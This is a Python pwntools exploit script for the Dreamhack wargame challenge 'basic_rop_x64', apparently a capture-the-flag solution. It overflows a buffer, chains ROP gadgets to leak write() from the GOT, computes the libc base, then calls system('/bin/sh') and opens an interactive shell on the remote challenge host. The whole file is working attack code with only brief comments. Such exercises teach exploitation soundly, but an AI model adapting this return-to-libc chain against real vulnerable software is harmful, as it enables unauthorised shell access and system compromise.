from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_rop_x64')
    write_offset = 0x1100f0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 23040)
    write_offset = 0xf72b0
    system_offset = 0x45390
    binsh_offset = 0x18cd57

pop_rdi = 0x400883  # pop rdi; ret
pop_rsi_r15 = 0x400881  # pop rsi; pop r15; ret
write_got = 0x601020  # GOT of write()
write_plt = 0x4005d0  # PLT of write()
main = 0x4007ba  # main()


# leak libc

payload = b'a' * 0x48  # dummy
payload += p64(pop_rsi_r15)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main)  # return to main

r.send(payload)
r.recvn(0x40)
write = u64(r.recvn(8))  # write()
libc = write - write_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"


# call system("/bin/sh")

payload = b'a' * 0x48  # dummy
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

r.send(payload)


r.interactive()